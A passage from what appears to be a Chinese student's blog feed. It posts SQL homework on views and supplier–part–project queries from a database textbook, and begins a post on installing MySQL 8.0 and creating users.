class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Grade</span><br><span class="line"><span class="keyword">FROM</span> IS_S1</span><br><span class="line"><span class="keyword">WHERE</span> Grade<span class="operator">&gt;=</span><span class="number">90</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 88</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> BT_S(Sno,Sname,Sbirth)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,<span class="number">2020</span><span class="operator">-</span>Sage</span><br><span class="line"><span class="keyword">FROM</span> Student;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 89</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> S_G(Sno,Gavg)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,<span class="built_in">AVG</span>(Grade)</span><br><span class="line"><span class="keyword">FROM</span> SC</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> Sno;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 90</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> F_Student(F_Sno,name,sex,age,dept)</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Ssex<span class="operator">=</span><span class="string">&#x27;女&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 91</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> BT_S;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">VIEW</span> IS_S1 CASCADE;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/84.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/85.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/86.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/87.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/88.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/89.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/90.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/91.png"></p><h3 id="查询视图-例3-92-3-94"><a href="#查询视图-例3-92-3-94" class="headerlink" title="查询视图(例3.92-3.94)"></a>查询视图(例3.92-3.94)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 92</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sage</span><br><span class="line"><span class="keyword">FROM</span> IS_Student</span><br><span class="line"><span class="keyword">WHERE</span> Sage<span class="operator">&lt;</span><span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 93</span></span><br><span class="line"><span class="keyword">SELECT</span> IS_Student.Sno,Sname</span><br><span class="line"><span class="keyword">FROM</span> IS_Student,SC</span><br><span class="line"><span class="keyword">WHERE</span> IS_Student.Sno<span class="operator">=</span>SC.Sno <span class="keyword">AND</span> SC.Cno<span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 94</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> S_G</span><br><span class="line"><span class="keyword">WHERE</span> Gavg<span class="operator">&gt;=</span><span class="number">90</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/92.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/93.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/94.png"></p><h3 id="更新视图-例3-95-3-97"><a href="#更新视图-例3-95-3-97" class="headerlink" title="更新视图(例3.95-3.97)"></a>更新视图(例3.95-3.97)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 95</span></span><br><span class="line"><span class="keyword">UPDATE</span> IS_Student</span><br><span class="line"><span class="keyword">SET</span> Sname<span class="operator">=</span> <span class="string">&#x27;刘辰&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span> <span class="string">&#x27;201215122&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 96</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">VIEW</span> IS_Student</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> Sno,Sname,Sage,Sdept</span><br><span class="line"><span class="keyword">FROM</span> Student</span><br><span class="line"><span class="keyword">WHERE</span> Sdept<span class="operator">=</span> <span class="string">&#x27;IS&#x27;</span></span><br><span class="line"><span class="keyword">WITH</span> <span class="keyword">CHECK</span> OPTION;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> IS_Student</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;201215129&#x27;</span>,<span class="string">&#x27;赵新&#x27;</span>,<span class="number">20</span>,<span class="string">&#x27;IS&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 97</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> IS_Student</span><br><span class="line"><span class="keyword">WHERE</span> Sno<span class="operator">=</span><span class="string">&#x27;201215129&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/95.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/96.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/97.png"></p><h2 id="习题3-4"><a href="#习题3-4" class="headerlink" title="习题3.4"></a>习题3.4</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> S</span><br><span class="line">(SNO <span class="type">CHAR</span>(<span class="number">3</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">SNAME <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">STATUS <span class="type">CHAR</span>(<span class="number">2</span>),</span><br><span class="line">CITY <span class="type">CHAR</span>(<span class="number">10</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> P</span><br><span class="line">(PNO <span class="type">CHAR</span>(<span class="number">3</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">PNAME <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">COLOR <span class="type">CHAR</span>(<span class="number">4</span>),</span><br><span class="line">WEIGHT <span class="type">SMALLINT</span>);</span><br><span class="line">     </span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> J</span><br><span class="line">(JNO <span class="type">CHAR</span>(<span class="number">3</span>) <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">JNAME <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">CITY <span class="type">CHAR</span>(<span class="number">10</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> SPJ</span><br><span class="line">(SNO <span class="type">CHAR</span>(<span class="number">3</span>),</span><br><span class="line">PNO <span class="type">CHAR</span>(<span class="number">3</span>),</span><br><span class="line">JNO <span class="type">CHAR</span>(<span class="number">3</span>),</span><br><span class="line">QTY<span class="type">SMALLINT</span>,</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (SNO) <span class="keyword">REFERENCES</span> S(Sno),</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (PNO) <span class="keyword">REFERENCES</span> P(Pno),</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (JNO) <span class="keyword">REFERENCES</span> J(Jno));</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> S</span><br><span class="line"><span class="keyword">VALUES</span>  (<span class="string">&#x27;S1&#x27;</span>,<span class="string">&#x27;精益&#x27;</span>,<span class="string">&#x27;20&#x27;</span>,<span class="string">&#x27;天津&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;S2&#x27;</span>,<span class="string">&#x27;盛锡&#x27;</span>,<span class="string">&#x27;10&#x27;</span>,<span class="string">&#x27;北京&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;S3&#x27;</span>,<span class="string">&#x27;东方红&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;北京&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;S4&#x27;</span>,<span class="string">&#x27;丰泰盛&#x27;</span>,<span class="string">&#x27;20&#x27;</span>,<span class="string">&#x27;天津&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;S5&#x27;</span>,<span class="string">&#x27;为民&#x27;</span>,<span class="string">&#x27;30&#x27;</span>,<span class="string">&#x27;上海&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> P</span><br><span class="line"><span class="keyword">VALUES</span>  (<span class="string">&#x27;P1&#x27;</span>,<span class="string">&#x27;螺母&#x27;</span>,<span class="string">&#x27;红&#x27;</span>,<span class="number">12</span>),</span><br><span class="line">        (<span class="string">&#x27;P2&#x27;</span>,<span class="string">&#x27;螺栓&#x27;</span>,<span class="string">&#x27;绿&#x27;</span>,<span class="number">17</span>),</span><br><span class="line">        (<span class="string">&#x27;P3&#x27;</span>,<span class="string">&#x27;螺丝刀&#x27;</span>,<span class="string">&#x27;蓝&#x27;</span>,<span class="number">14</span>),</span><br><span class="line">        (<span class="string">&#x27;P4&#x27;</span>,<span class="string">&#x27;螺丝刀&#x27;</span>,<span class="string">&#x27;红&#x27;</span>,<span class="number">14</span>),</span><br><span class="line">        (<span class="string">&#x27;P5&#x27;</span>,<span class="string">&#x27;凸轮&#x27;</span>,<span class="string">&#x27;蓝&#x27;</span>,<span class="number">40</span>),</span><br><span class="line">        (<span class="string">&#x27;P6&#x27;</span>,<span class="string">&#x27;齿轮&#x27;</span>,<span class="string">&#x27;红&#x27;</span>,<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> J</span><br><span class="line"><span class="keyword">VALUES</span>  (<span class="string">&#x27;J1&#x27;</span>,<span class="string">&#x27;三建&#x27;</span>,<span class="string">&#x27;北京&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;J2&#x27;</span>,<span class="string">&#x27;一汽&#x27;</span>,<span class="string">&#x27;长春&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;J3&#x27;</span>,<span class="string">&#x27;弹簧厂&#x27;</span>,<span class="string">&#x27;天津&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;J4&#x27;</span>,<span class="string">&#x27;造船厂&#x27;</span>,<span class="string">&#x27;天津&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;J5&#x27;</span>,<span class="string">&#x27;机车厂&#x27;</span>,<span class="string">&#x27;唐山&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;J6&#x27;</span>,<span class="string">&#x27;无线电厂&#x27;</span>,<span class="string">&#x27;常州&#x27;</span>),</span><br><span class="line">        (<span class="string">&#x27;J7&#x27;</span>,<span class="string">&#x27;半导体厂&#x27;</span>,<span class="string">&#x27;南京&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SPJ</span><br><span class="line"><span class="keyword">VALUES</span>  (<span class="string">&#x27;S1&#x27;</span>,<span class="string">&#x27;P1&#x27;</span>,<span class="string">&#x27;J1&#x27;</span>,<span class="number">200</span>),</span><br><span class="line">        (<span class="string">&#x27;S1&#x27;</span>,<span class="string">&#x27;P1&#x27;</span>,<span class="string">&#x27;J3&#x27;</span>,<span class="number">100</span>),</span><br><span class="line">        (<span class="string">&#x27;S1&#x27;</span>,<span class="string">&#x27;P1&#x27;</span>,<span class="string">&#x27;J4&#x27;</span>,<span class="number">700</span>),</span><br><span class="line">        (<span class="string">&#x27;S1&#x27;</span>,<span class="string">&#x27;P2&#x27;</span>,<span class="string">&#x27;J2&#x27;</span>,<span class="number">100</span>),</span><br><span class="line">        (<span class="string">&#x27;S2&#x27;</span>,<span class="string">&#x27;P3&#x27;</span>,<span class="string">&#x27;J1&#x27;</span>,<span class="number">400</span>),</span><br><span class="line">        (<span class="string">&#x27;S2&#x27;</span>,<span class="string">&#x27;P3&#x27;</span>,<span class="string">&#x27;J2&#x27;</span>,<span class="number">200</span>),</span><br><span class="line">        (<span class="string">&#x27;S2&#x27;</span>,<span class="string">&#x27;P3&#x27;</span>,<span class="string">&#x27;J4&#x27;</span>,<span class="number">500</span>),</span><br><span class="line">        (<span class="string">&#x27;S2&#x27;</span>,<span class="string">&#x27;P3&#x27;</span>,<span class="string">&#x27;J5&#x27;</span>,<span class="number">400</span>),</span><br><span class="line">        (<span class="string">&#x27;S2&#x27;</span>,<span class="string">&#x27;P5&#x27;</span>,<span class="string">&#x27;J1&#x27;</span>,<span class="number">400</span>),</span><br><span class="line">        (<span class="string">&#x27;S2&#x27;</span>,<span class="string">&#x27;P5&#x27;</span>,<span class="string">&#x27;J2&#x27;</span>,<span class="number">100</span>),</span><br><span class="line">        (<span class="string">&#x27;S3&#x27;</span>,<span class="string">&#x27;P1&#x27;</span>,<span class="string">&#x27;J1&#x27;</span>,<span class="number">200</span>),</span><br><span class="line">        (<span class="string">&#x27;S3&#x27;</span>,<span class="string">&#x27;P3&#x27;</span>,<span class="string">&#x27;J1&#x27;</span>,<span class="number">200</span>),</span><br><span class="line">        (<span class="string">&#x27;S4&#x27;</span>,<span class="string">&#x27;P5&#x27;</span>,<span class="string">&#x27;J1&#x27;</span>,<span class="number">100</span>),</span><br><span class="line">        (<span class="string">&#x27;S4&#x27;</span>,<span class="string">&#x27;P6&#x27;</span>,<span class="string">&#x27;J3&#x27;</span>,<span class="number">300</span>),</span><br><span class="line">        (<span class="string">&#x27;S4&#x27;</span>,<span class="string">&#x27;P6&#x27;</span>,<span class="string">&#x27;J4&#x27;</span>,<span class="number">200</span>),</span><br><span class="line">        (<span class="string">&#x27;S5&#x27;</span>,<span class="string">&#x27;P2&#x27;</span>,<span class="string">&#x27;J4&#x27;</span>,<span class="number">100</span>),</span><br><span class="line">        (<span class="string">&#x27;S5&#x27;</span>,<span class="string">&#x27;P3&#x27;</span>,<span class="string">&#x27;J1&#x27;</span>,<span class="number">200</span>),</span><br><span class="line">        (<span class="string">&#x27;S5&#x27;</span>,<span class="string">&#x27;P6&#x27;</span>,<span class="string">&#x27;J2&#x27;</span>,<span class="number">200</span>),</span><br><span class="line">        (<span class="string">&#x27;S5&#x27;</span>,<span class="string">&#x27;P6&#x27;</span>,<span class="string">&#x27;J4&#x27;</span>,<span class="number">500</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/4-1.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/4-2.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/4-3.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/4-4.png"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> SNO</span><br><span class="line"><span class="keyword">FROM</span> SPJ</span><br><span class="line"><span class="keyword">WHERE</span> JNO<span class="operator">=</span><span class="string">&#x27;J1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">SELECT</span> SNO</span><br><span class="line"><span class="keyword">FROM</span> SPJ</span><br><span class="line"><span class="keyword">WHERE</span> JNO<span class="operator">=</span><span class="string">&#x27;J1&#x27;</span> <span class="keyword">AND</span> PNO<span class="operator">=</span><span class="string">&#x27;P1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)</span></span><br><span class="line"><span class="keyword">SELECT</span> SNO</span><br><span class="line"><span class="keyword">FROM</span> SPJ</span><br><span class="line"><span class="keyword">WHERE</span> JNO<span class="operator">=</span><span class="string">&#x27;J1&#x27;</span> <span class="keyword">AND</span> PNO <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> PNO</span><br><span class="line"><span class="keyword">FROM</span> P</span><br><span class="line"><span class="keyword">WHERE</span> COLOR<span class="operator">=</span><span class="string">&#x27;红&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)</span></span><br><span class="line"><span class="keyword">SELECT</span> JNO</span><br><span class="line"><span class="keyword">FROM</span> J</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> SPJ,S,P</span><br><span class="line"><span class="keyword">WHERE</span> SPJ.JNO<span class="operator">=</span>J.JNO <span class="keyword">AND</span></span><br><span class="line">SPJ.SNO<span class="operator">=</span>S.SNO <span class="keyword">AND</span></span><br><span class="line">SPJ.PNO<span class="operator">=</span>P.PNO <span class="keyword">AND</span></span><br><span class="line">S.CITY<span class="operator">=</span><span class="string">&#x27;天津&#x27;</span> <span class="keyword">AND</span></span><br><span class="line">P.COLOR<span class="operator">=</span><span class="string">&#x27;红&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)</span></span><br><span class="line"><span class="keyword">SELECT</span> JNO</span><br><span class="line"><span class="keyword">FROM</span> J JX</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line"><span class="comment">/*如果不存在JX没用过的S1提供的任一零件，返回true*/</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> SPJ SPJX</span><br><span class="line"><span class="keyword">WHERE</span> SNO<span class="operator">=</span><span class="string">&#x27;S1&#x27;</span> <span class="keyword">AND</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line"><span class="comment">/*如果工程JX有没用过S1提供的零件，返回true*/</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> SPJ SPJY</span><br><span class="line"><span class="keyword">WHERE</span> SPJY.PNO<span class="operator">=</span>SPJX.PNO <span class="keyword">AND</span> SPJY.JNO<span class="operator">=</span>JX.JNO));</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/4-5.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/4-6.png"></p><h2 id="习题3-5"><a href="#习题3-5" class="headerlink" title="习题3.5"></a>习题3.5</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">SELECT</span> SNAME,CITY <span class="keyword">FROM</span> S;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">SELECT</span> PNAME,COLOR,WEIGHT <span class="keyword">FROM</span> P;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (3)</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> JNO <span class="keyword">FROM</span> SPJ <span class="keyword">WHERE</span> SNO<span class="operator">=</span><span class="string">&#x27;S1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (4)</span></span><br><span class="line"><span class="keyword">SELECT</span> P.PNAME,SPJ.QTY</span><br><span class="line"><span class="keyword">FROM</span> P,SPJ</span><br><span class="line"><span class="keyword">WHERE</span> P.PNO<span class="operator">=</span>SPJ.PNO <span class="keyword">AND</span> SPJ.JNO<span class="operator">=</span><span class="string">&#x27;J2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (5)</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> PNO</span><br><span class="line"><span class="keyword">FROM</span> SPJ</span><br><span class="line"><span class="keyword">WHERE</span> SNO <span class="keyword">IN</span></span><br><span class="line">(<span class="keyword">SELECT</span> SNO</span><br><span class="line"><span class="keyword">FROM</span> S</span><br><span class="line"><span class="keyword">WHERE</span> S.CITY<span class="operator">=</span><span class="string">&#x27;上海&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (6)</span></span><br><span class="line"><span class="keyword">SELECT</span> JNAME</span><br><span class="line"><span class="keyword">FROM</span> J,SPJ,S</span><br><span class="line"><span class="keyword">WHERE</span> J.JNO<span class="operator">=</span>SPJ.JNO <span class="keyword">AND</span></span><br><span class="line">SPJ.SNO<span class="operator">=</span>S.SNO <span class="keyword">AND</span></span><br><span class="line">S.CITY<span class="operator">=</span><span class="string">&#x27;上海&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (7)</span></span><br><span class="line"><span class="keyword">SELECT</span> JNO</span><br><span class="line"><span class="keyword">FROM</span> J</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> SPJ,S</span><br><span class="line"><span class="keyword">WHERE</span> SPJ.JNO<span class="operator">=</span>J.JNO <span class="keyword">AND</span></span><br><span class="line">SPJ.SNO<span class="operator">=</span>S.SNO <span class="keyword">AND</span></span><br><span class="line">S.CITY<span class="operator">=</span><span class="string">&#x27;天津&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (8)</span></span><br><span class="line"><span class="keyword">UPDATE</span> P</span><br><span class="line"><span class="keyword">SET</span> COLOR<span class="operator">=</span><span class="string">&#x27;蓝&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> COLOR<span class="operator">=</span><span class="string">&#x27;红&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (9)</span></span><br><span class="line"><span class="keyword">UPDATE</span> SPJ</span><br><span class="line"><span class="keyword">SET</span> SNO<span class="operator">=</span><span class="string">&#x27;S3&#x27;</span></span><br><span class="line"><span class="keyword">WHERE</span> SNO<span class="operator">=</span><span class="string">&#x27;S5&#x27;</span> <span class="keyword">AND</span> JNO<span class="operator">=</span><span class="string">&#x27;J4&#x27;</span> <span class="keyword">AND</span> PNO<span class="operator">=</span><span class="string">&#x27;P6&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (10)</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> SPJ <span class="keyword">WHERE</span> SNO<span class="operator">=</span><span class="string">&#x27;S2&#x27;</span>;</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> S <span class="keyword">WHERE</span> SNO<span class="operator">=</span><span class="string">&#x27;S2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (11)</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> SPJ</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">&#x27;S2&#x27;</span>,<span class="string">&#x27;P4&#x27;</span>,<span class="string">&#x27;J6&#x27;</span>,<span class="number">200</span>);</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/5-1.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/5-2.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/5-3.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/5-4.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/5-5.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/5-6.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/5-7.png"></p><h2 id="习题3-9"><a href="#习题3-9" class="headerlink" title="习题3.9"></a>习题3.9</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建视图</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> V_SPJ</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> SPJ.SNO,SPJ.PNO,SPJ.QTY</span><br><span class="line"><span class="keyword">FROM</span> SPJ,J</span><br><span class="line"><span class="keyword">WHERE</span> SPJ.JNO<span class="operator">=</span>J.JNO <span class="keyword">AND</span> J.JNAME<span class="operator">=</span><span class="string">&#x27;三建&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (1)</span></span><br><span class="line"><span class="keyword">SELECT</span> PNO,<span class="built_in">SUM</span>(QTY)</span><br><span class="line"><span class="keyword">FROM</span> V_SPJ</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> PNO;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- (2)</span></span><br><span class="line"><span class="keyword">SELECT</span> PNO,QTY</span><br><span class="line"><span class="keyword">FROM</span> V_SPJ</span><br><span class="line"><span class="keyword">WHERE</span> SNO<span class="operator">=</span><span class="string">&#x27;S1&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/db-hw5%266/9-1.png"></p><p><img src="https://img.lfalive.top/db-hw5%266/9-2.png"></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> databases </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《数据库系统概论》例程及习题（一）</title>
      <link href="/2020/05/17/db-hw3&amp;4/"/>
      <url>/2020/05/17/db-hw3&amp;4/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>选修了学校的数据库课程，把作业和实验相关发上来做记录。</p><p>教材是《数据库系统概论》第五版，高等教育出版社，王珊等编著；《数据库系统概论实验指导与习题解析》，王珊编著。参考链接有<a href="https://chinadb.ruc.edu.cn/home/nav/7/sub/4/third/33">人大信息学院数据库系统概论资源</a>。</p><p>参考视频是<a href="https://www.bilibili.com/video/BV13J411J7Vu">数据库系统概论完整版(基础篇+高级篇+新技术篇)</a>和<a href="https://www.bilibili.com/video/BV1DE411n7fU">武沛齐7天MySQL魔鬼训练营（入门到高手）</a>。</p><p>MySQL版本是8.0.19。参考链接有<a href="https://dev.mysql.com/doc/refman/8.0/en/">MySQL 8.0 Reference Manual</a>和<a href="https://www.cnblogs.com/lhboke/p/12396592.html">Windows10下mysql 8.0.19 安装配置方法图文教程</a> 。我添加系统变量的方法和参考略有区别，直接在系统path中添加了mysql目录&#x2F;bin。</p><p>这次内容是数据库安装和基本操作。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><img src="https://img.lfalive.top/db-hw3%264/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E8%A3%85%E6%88%AA%E5%9B%BE1.png" alt="数据库安装截图1"></p><p><img src="https://img.lfalive.top/db-hw3%264/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E8%A3%85%E6%88%AA%E5%9B%BE2.png" alt="数据库安装截图2"></p><p><img src="https://img.lfalive.top/db-hw3%264/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E8%A3%85%E6%88%AA%E5%9B%BE3.png" alt="数据库安装截图3"></p><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><h4 id="默认用户-root"><a href="#默认用户-root" class="headerlink" title="默认用户:root"></a>默认用户:root</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;host&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;password&#x27;</span>;</span><br></pre></td></tr></table></figure><p>username：你将创建的用户名。<br>host：指定该用户在哪个主机上可以登陆，如果是本地用户可用localhost，如果想让该用户可以从任意远程主机登陆，可以使用通配符%。<br>password：该用户的登陆密码，密码可以为空，如果为空则该用户可以不需要密码登陆服务器。<br>例如：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;dog&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;192.168.1.101_&#x27;</span> IDENDIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;pig&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure><h4 id="其它用户管理命令"><a href="#其它用户管理命令" class="headerlink" title="其它用户管理命令"></a>其它用户管理命令</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> 